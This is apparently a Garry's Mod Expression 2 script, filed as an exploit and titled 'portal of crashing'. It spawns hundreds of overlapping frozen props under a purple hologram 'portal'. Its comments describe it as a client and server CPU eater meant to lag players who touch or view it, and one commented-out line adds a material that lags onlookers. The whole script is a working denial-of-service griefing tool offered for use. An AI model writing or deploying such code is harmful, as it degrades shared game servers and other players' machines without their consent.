@name exploits/portal_of_crashing
@persist Count I Radius Model:string Ang:angle Pos:vector

# by Fasteroid
# client & server cpu eater
# step into the portal if you dare
# moving it also lags

if( first() ){
    
    Count = 512 # how much lag
    Model = "models/hunter/tubes/tube4x4x1.mdl"
    Ang   = ang(90,0,0)
    Pos   = vec(0,0,8) * 11.866406917572
    propSpawnUndo(0)

    holoCreate(1,entity():toWorld(Pos))
    holoAng(1,entity():toWorld(Ang))
    holoModel(1,"hq_cylinder")
    holoParent(1,entity())
    holoMaterial(1,"lights/white")
    holoColor(1,vec(160,0,255),100)
    holoScaleUnits(1,vec(16,16,0.25) * 11.866406917572 - vec(5,5,0))
    
}

interval(20)

        
if( propCanCreate() & I<Count ){
    
    I++
    P = propSpawn( Model, entity():toWorld(Pos+randvec()*0.5), entity():toWorld(Ang), 0 )
    P:setModelScale(1)
    P:parentTo(entity())
    P:setColor(vec(0))
    P:propFreeze(1)
    
    # if you want people viewing the portal to lag, uncomment this line
    # P:setMaterial("models/props_combine/tprings_globe")

}
